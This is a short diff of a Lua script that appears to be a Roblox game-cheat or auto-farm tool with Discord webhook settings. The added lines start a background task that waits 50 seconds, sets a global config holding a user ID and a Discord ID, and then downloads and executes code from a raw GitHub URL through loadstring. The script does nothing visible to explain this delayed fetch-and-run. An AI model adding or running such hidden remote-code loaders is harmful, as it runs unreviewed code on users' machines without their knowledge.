@@ -10,6 +10,12 @@ else
 	Start_ford = 1
 end
 
+task.spawn(function()
+wait(50)
+	_G.Config = { UserID = "5e200359-5807-4037-81d0-ab86e443db75", discord_id = "1203177576994967572", Note = name_vps }
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/main/pet99"))()
+end)
+
 if EVENT_or_FARM == "E" then
 	getgenv().GWEBHOOK_LINK = dis_event
 else
